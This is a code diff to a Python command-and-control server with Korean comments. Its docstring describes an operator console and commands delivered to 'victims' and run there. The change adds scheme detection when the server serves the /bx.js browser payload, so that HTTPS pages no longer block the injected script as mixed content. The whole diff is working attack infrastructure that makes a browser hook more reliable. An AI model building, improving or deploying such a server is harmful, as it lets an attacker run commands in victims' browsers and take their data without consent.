@@ -14,7 +14,7 @@
   GET  /bxconsole    운영자 웹 콘솔 (구 /op → 302 리다이렉트)
 명령 상태: QUEUED(대기) → SENT(피해자 전달) → DONE(실행·결과 수신)
 """
-import http.server, socketserver, json, time, os, sys, re, base64, shutil, urllib.parse, random, string, threading
+import http.server, socketserver, json, time, os, sys, re, base64, shutil, ssl, urllib.parse, random, string, threading
 
 PORT  = int(os.environ.get("BX_C2_PORT", "7700"))
 ROOT  = os.path.dirname(os.path.abspath(__file__))
@@ -341,7 +341,11 @@ class Handler(http.server.BaseHTTPRequestHandler):
         u = urllib.parse.urlparse(self.path); p, q = u.path, urllib.parse.parse_qs(u.query)
         if p == "/bx.js":
             host = self.headers.get("Host", f"127.0.0.1:{PORT}")
-            js = open(PAYLOAD).read().replace("__C2__", f"http://{host}")
+            # 스킴 자동 감지 — https 페이지에서 mixed content 차단 방지
+            # (역프록시: X-Forwarded-Proto / 직접 TLS: SSLSocket / 기본: http)
+            xfp = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip().lower()
+            proto = xfp or ("https" if isinstance(self.connection, ssl.SSLSocket) else "http")
+            js = open(PAYLOAD).read().replace("__C2__", f"{proto}://{host}")
             self._send(200, "application/javascript", js.encode())
         elif p == "/sse":
             vid = sanitize_vid(q.get("id", [""])[0])
